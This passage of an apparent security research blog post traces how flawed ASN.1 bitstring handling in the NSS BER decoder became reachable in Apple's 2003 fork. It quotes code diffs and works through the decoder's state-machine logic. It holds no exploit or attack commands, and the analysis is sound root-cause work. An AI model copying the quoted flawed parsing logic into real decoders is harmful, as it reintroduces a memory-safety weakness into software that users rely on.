 <p class="c6"><span class="c1 c12">-</span><span class="c3 c12">&nbsp;&nbsp; PORT_Assert </span><span class="c1 c12">(</span><span class="c3 c12">state</span><span class="c1 c12">-&gt;</span><span class="c3 c12">pending </span><span class="c1 c12">&gt;</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">0</span><span class="c1 c12">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c23">/*PORT_Assert (state-&gt;pending &gt; 0); */</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; PORT_Assert </span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">==</span><span class="c3">&nbsp;beforeBitString</span><span class="c1">);</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c1 c4">+</span><span class="c3 c4">&nbsp;&nbsp; </span><span class="c16 c4">if</span><span class="c3 c4">&nbsp;</span><span class="c1 c4">(</span><span class="c3 c4">state</span><span class="c1 c4">-&gt;</span><span class="c3 c4">pending </span><span class="c1 c4">==</span><span class="c3 c4">&nbsp;</span><span class="c11 c4">0</span><span class="c1 c4">)</span><span class="c3 c4">&nbsp;</span><span class="c1 c4">{</span></p>
 <p class="c6"><span class="c1 c4">+</span><span class="c3 c4">&nbsp;&nbsp; &nbsp; &nbsp; </span><span class="c16 c4">if</span><span class="c3 c4">&nbsp;</span><span class="c1 c4">(</span><span class="c3 c4">state</span><span class="c1 c4">-&gt;</span><span class="c3 c4">dest </span><span class="c1 c4">!=</span><span class="c3 c4">&nbsp;NULL</span><span class="c1 c4">)</span><span class="c3 c4">&nbsp;</span><span class="c1 c4">{</span></p>
 <p class="c6"><span class="c1 c4">+</span><span class="c3 c4">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c20 c4">SECItem</span><span class="c3 c4">&nbsp;</span><span class="c1 c4">*</span><span class="c3 c4">item </span><span class="c1 c4">=</span><span class="c3 c4">&nbsp;</span><span class="c1 c4">(</span><span class="c20 c4">SECItem</span><span class="c3 c4">&nbsp;</span><span class="c1 c4">*)(</span><span class="c3 c4">state</span><span class="c1 c4">-&gt;</span><span class="c3 c4">dest</span><span class="c1 c4">);</span></p>
 <p class="c6"><span class="c1 c4">+</span><span class="c3 c4">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; item</span><span class="c1 c4">-&gt;</span><span class="c3 c4">data </span><span class="c1 c4">=</span><span class="c3 c4">&nbsp;NULL</span><span class="c1 c4">;</span></p>
 <p class="c6"><span class="c1 c4">+</span><span class="c3 c4">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; item</span><span class="c1 c4">-&gt;</span><span class="c3 c4">len </span><span class="c1 c4">=</span><span class="c3 c4">&nbsp;</span><span class="c11 c4">0</span><span class="c1 c4">;</span></p>
 <p class="c6"><span class="c1 c4">+</span><span class="c3 c4">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1 c4">-&gt;</span><span class="c3 c4">place </span><span class="c1 c4">=</span><span class="c3 c4">&nbsp;beforeEndOfContents</span><span class="c1 c4">;</span></p>
 <p class="c6"><span class="c1 c4">+</span><span class="c3 c4">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16 c4">return</span><span class="c3 c4">&nbsp;</span><span class="c11 c4">0</span><span class="c1 c4">;</span></p>
 <p class="c6"><span class="c1 c4">+</span><span class="c3 c4">&nbsp;&nbsp; &nbsp; &nbsp; </span><span class="c1 c4">}</span></p>
 <p class="c6"><span class="c1 c4">+</span><span class="c3 c4">&nbsp;&nbsp; </span><span class="c1 c4">}</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">len </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">top</span><span class="c1">-&gt;</span><span class="c3">status </span><span class="c1">=</span><span class="c3">&nbsp;needBytes</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">byte</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">char</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">buf</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c16">byte</span><span class="c3">&nbsp;</span><span class="c1">&gt;</span><span class="c3">&nbsp;</span><span class="c11">7</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; PORT_SetError </span><span class="c1">(</span><span class="c3">SEC_ERROR_BAD_DER</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">top</span><span class="c1">-&gt;</span><span class="c3">status </span><span class="c1">=</span><span class="c3">&nbsp;decodeError</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">bit_string_unused_bits </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c16">byte</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;duringBitString</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">pending </span><span class="c1">-=</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">;</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">}</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c19 c7"></span></p>
 <p class="c6 c8 c15"><span>This commit added the </span><span class="c7">item-&gt;data = NULL</span><span>&nbsp;line but here it&#39;s only reachable when </span><span class="c7">pending == 0</span><span>. I am fairly convinced that this was dead code and not actually reachable (and that the </span><span class="c7">PORT_Assert</span><span class="c9">&nbsp;which they commented out was actually valid.)</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>The </span><span class="c7">beforeBitString</span><span>&nbsp;state (which leads to the </span><span class="c7">sec_asn1d_parse_bit_string</span><span>&nbsp;method being called) will always be preceded by the </span><span class="c7">afterLength</span><span>&nbsp;state (implemented by </span><span class="c7">sec_asn1d_prepare_for_contents.</span><span>) On entry to the </span><span class="c7">afterLength</span><span>&nbsp;state </span><span class="c7">state-&gt;contents_length</span><span>&nbsp;is equal to the parsed length field and &nbsp;</span><span class="c7">sec_asn1d_prepare_for_contents</span><span class="c9">&nbsp;does:</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c19 c7">state-&gt;pending = state-&gt;contents_length;</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>So in order to reach </span><span class="c7">sec_asn1d_parse_bit_string</span><span>&nbsp;with </span><span class="c7">state-&gt;pending == 0</span><span>, </span><span class="c7">state-&gt;contents_length</span><span>&nbsp;would also need to be </span><span class="c7">0</span><span>&nbsp;in </span><span class="c7">sec_asn1d_prepare_for_contents</span><span class="c9">.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>That means that in the if/else decision tree below, at least one of the two conditionals </span><span class="c17">must</span><span class="c9">&nbsp;be true:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.b58e1df8cbca28721618ec8bc93413630d1f04c0"></a><a id="t.18"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">contents_length </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c3">&nbsp;</span><span class="c1">&amp;&amp;</span><span class="c3">&nbsp;</span><span class="c1">(!</span><span class="c3">&nbsp;state</span><span class="c1">-&gt;</span><span class="c3">indefinite</span><span class="c1">))</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c23">/*</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* A zero-length simple or constructed string; we are done.</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;afterEndOfContents</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">...</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1">}</span><span class="c3">&nbsp;</span><span class="c16">else</span><span class="c3">&nbsp;</span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">indefinite</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c23">/*</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* An indefinite-length string *must* be constructed!</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dprintf</span><span class="c1">(</span><span class="c22">&quot;decodeError: prepare for contents indefinite not construncted\n&quot;</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PORT_SetError </span><span class="c1">(</span><span class="c3">SEC_ERROR_BAD_DER</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">top</span><span class="c1">-&gt;</span><span class="c3">status </span><span class="c1">=</span><span class="c3">&nbsp;decodeError</span><span class="c1">;</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>yet it is required that </span><span class="c17">neither</span><span>&nbsp;of those be true in order to reach the final </span><span class="c7">else</span><span>&nbsp;which is the only path to reaching </span><span class="c7">sec_asn1d_parse_bit_string</span><span>&nbsp;via the </span><span class="c7">beforeBitString</span><span class="c9">&nbsp;state:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.fc4cdcb36935579371eeed8ebee2943f0d688093"></a><a id="t.19"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1">}</span><span class="c3">&nbsp;</span><span class="c16">else</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c23">/*</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* A non-zero-length simple string.</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">underlying_kind </span><span class="c1">==</span><span class="c3">&nbsp;SEC_ASN1_BIT_STRING</span><span class="c1">)</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;beforeBitString</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">else</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;duringLeaf</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1">}</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>So at that point (24 August 2001) the NSS codebase had some dead code which looked like it was trying to handle parsing an ASN.1 </span><span class="c7">bitstring</span><span class="c9">&nbsp;which didn&#39;t have an unused-bits byte. As we&#39;ve seen in the rest of this post though, that handling is quite wrong, but it didn&#39;t matter as the code was unreachable. </span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>The earliest reference to Apple&#39;s fork of that NSS code I can find is in the </span><span class="c21"><a class="c241" href="https://github.com/apple-oss-distributions/SecurityNssAsn1/tree/SecurityNssAsn1-11">SecurityNssAsn1-11</a></span><span>&nbsp;package for OS X 10.3 (Panther) which would have been released October 24th, 2003. In that project we can find a </span><span class="c7">CHANGES.apple</span><span>&nbsp;file which tells us </span><span class="c21"><a class="c241" href="https://github.com/apple-oss-distributions/SecurityNssAsn1/blob/SecurityNssAsn1-11/CHANGES.Apple">a little more about the origins of Apple&#39;s fork</a></span><span class="c9">:</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8"><span class="c19 c7">General Notes</span></p>
 <p class="c6 c8"><span class="c19 c7">-------------</span></p>
 <p class="c0"><span class="c19 c7"></span></p>
 <p class="c6 c8"><span class="c19 c7">1. This module, SecurityNssAsn1, is based on the Netscape Security</span></p>
 <p class="c6 c8"><span class="c19 c7">&nbsp; &nbsp;Services (&quot;NSS&quot;) portion of the Mozilla Browser project. The </span></p>
 <p class="c6 c8"><span class="c19 c7">&nbsp; &nbsp;source upon which SecurityNssAsn1 was based was pulled from </span></p>
 <p class="c6 c8"><span class="c7 c19">&nbsp; &nbsp;the Mozilla CVS repository, top of tree as of January 21, 2003. </span></p>
 <p class="c6 c8"><span class="c19 c7">&nbsp; &nbsp;The SecurityNssAsn1 project contains only those portions of NSS </span></p>
 <p class="c6 c8"><span class="c19 c7">&nbsp; &nbsp;used to perform BER encoding and decoding, along with minimal </span></p>
 <p class="c6 c8"><span class="c19 c7">&nbsp; &nbsp;support required by the encode/decode routines.</span></p>
 <p class="c0"><span class="c19 c7"></span></p>
 <p class="c6 c8"><span class="c19 c7">2. The directory structure of SecurityNssAsn1 differs significantly</span></p>
 <p class="c6 c8"><span class="c19 c7">&nbsp; &nbsp;from that of NSS, rendering simple diffs to document changes</span></p>
 <p class="c6 c8"><span class="c19 c7">&nbsp; &nbsp;unwieldy. Diffs could still be performed on a file-by-file basis.</span></p>
 <p class="c6 c8"><span class="c19 c7">&nbsp; &nbsp;</span></p>
 <p class="c6 c8"><span class="c19 c7">3. All Apple changes are flagged by the symbol __APPLE__, either</span></p>
 <p class="c6 c8"><span class="c19 c7">&nbsp; &nbsp;via &quot;#ifdef __APPLE__&quot; or in a comment. </span></p>
 <p class="c0 c15"><span class="c19 c7"></span></p>
 <p class="c6 c8 c15"><span>That document continues on to outline a number of broad changes which Apple made to the code, including reformatting the code and changing a number of APIs to add new features. We also learn the date at which Apple forked the code (January 21, 2003) so we can go back through a github mirror of the mozilla CVS repository to find </span><span class="c21"><a class="c241" href="https://github.com/jrmuizel/mozilla-cvs-history/blob/1f25ac6059384ad941cb20481acef0e6b4d46dbd/security/nss/lib/util/secasn1d.c">the version of secasn1d.c as it would have appeared then</a></span><span>&nbsp;and diff them.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">From that diff we can see that the Apple developers actually made fairly significant changes in this initial import, indicating that this code underwent some level of review prior to importing it. For example:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.29dca04094676297fb74e68684dc5ebea1c1ec48"></a><a id="t.20"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c1">@@</span><span class="c3">&nbsp;</span><span class="c1">-</span><span class="c11">1584</span><span class="c1">,</span><span class="c11">7</span><span class="c3">&nbsp;</span><span class="c1">+</span><span class="c11">1692</span><span class="c1">,</span><span class="c11">15</span><span class="c3">&nbsp;</span><span class="c1">@@</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp;</span><span class="c23">/*</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp; &nbsp; * If our child was just our end-of-contents octets, we are done.</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp; &nbsp; */</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c23">#ifdef</span><span class="c2">&nbsp; __APPLE__</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c23">/* </span></p>
 <p class="c6"><span class="c23">+ &nbsp; &nbsp; &nbsp; &nbsp;* Without the check for !child-&gt;indefinite, this path could</span></p>
 <p class="c6"><span class="c23">+ &nbsp; &nbsp; &nbsp; &nbsp;* be taken erroneously if the child is indefinite!</span></p>
 <p class="c6"><span class="c23">+ &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16">if</span><span class="c1">(</span><span class="c3">child</span><span class="c1">-&gt;</span><span class="c3">endofcontents </span><span class="c1">&amp;&amp;</span><span class="c3">&nbsp;</span><span class="c1">!</span><span class="c3">child</span><span class="c1">-&gt;</span><span class="c3">indefinite</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c23">#else</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp;</span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">child</span><span class="c1">-&gt;</span><span class="c3">endofcontents</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>They were pretty clearly looking for potential correctness issues with the code while they were refactoring it. The example shown above is a non-trivial change and one which persists to this day. (And I have no idea whether the NSS or Apple version is correct!) Reading the diff we can see that not every change ended up being marked with </span><span class="c7">#ifdef __APPLE__</span><span>&nbsp;or a comment. They also made this change to </span><span class="c7">sec_asn1d_parse_bit_string</span><span class="c9">:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.f88b5d5286baf17de20f09e61c06eac6b0acbd51"></a><a id="t.21"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c1">@@</span><span class="c3">&nbsp;</span><span class="c1">-</span><span class="c11">1372</span><span class="c1">,</span><span class="c11">26</span><span class="c3">&nbsp;</span><span class="c1">+</span><span class="c11">1469</span><span class="c1">,</span><span class="c11">33</span><span class="c3">&nbsp;</span><span class="c1">@@</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp;</span><span class="c23">/*PORT_Assert (state-&gt;pending &gt; 0); */</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp;PORT_Assert </span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">==</span><span class="c3">&nbsp;beforeBitString</span><span class="c1">);</span></p>
 <p class="c6"><span class="c2">&nbsp;</span></p>
 <p class="c6"><span class="c1">-</span><span class="c3">&nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">pending </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c1">-</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">dest </span><span class="c1">!=</span><span class="c3">&nbsp;NULL</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c1">-</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c20">SECItem</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">item </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c20">SECItem</span><span class="c3">&nbsp;</span><span class="c1">*)(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">dest</span><span class="c1">);</span></p>
 <p class="c6"><span class="c1">-</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;item</span><span class="c1">-&gt;</span><span class="c3">data </span><span class="c1">=</span><span class="c3">&nbsp;NULL</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">-</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;item</span><span class="c1">-&gt;</span><span class="c3">len </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">-</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;beforeEndOfContents</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">-</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">-</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c1">}</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">((</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">pending </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">||</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">contents_length </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">))</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">dest </span><span class="c1">!=</span><span class="c3">&nbsp;NULL</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c20">SECItem</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">item </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c20">SECItem</span><span class="c3">&nbsp;</span><span class="c1">*)(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">dest</span><span class="c1">);</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;item</span><span class="c1">-&gt;</span><span class="c20">Data</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;NULL</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;item</span><span class="c1">-&gt;</span><span class="c20">Length</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;beforeEndOfContents</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c1">}</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16">if</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">contents_length </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c23">/* skip over (unused) remainder byte */</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c1">}</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16">else</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">+</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c1">}</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp;</span><span class="c1">}</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>In the context of all the other changes in this initial import this change looks much less suspicious than I first thought. My guess is that the Apple developers thought that Mozilla had missed handling the case of a bitstring with only the unused-bits bytes and attempted to add support for it. It looks like the </span><span class="c7">state-&gt;pending == 0</span><span>&nbsp;conditional must have been Mozilla&#39;s check for handling a 0-length bitstring so therefore it was quite reasonable to think that the way it was handling that case by </span><span class="c7">NULL</span><span>ing out </span><span class="c7">item-&gt;data</span><span>&nbsp;was the right thing to do, so it must also be correct to add the </span><span class="c7">contents_length == 1</span><span class="c9">&nbsp;case here.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>In reality the </span><span class="c7">contents_length == 1</span><span>&nbsp;case was handled perfectly correctly anyway in </span><span class="c7">sec_asn1d_parse_more_bit_string</span><span>, but it wasn&#39;t unreasonable to assume that it had been overlooked based on what looked like a special case handling for the missing unused-bits byte in </span><span class="c7">sec_asn1d_parse_bit_string</span><span class="c9">.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
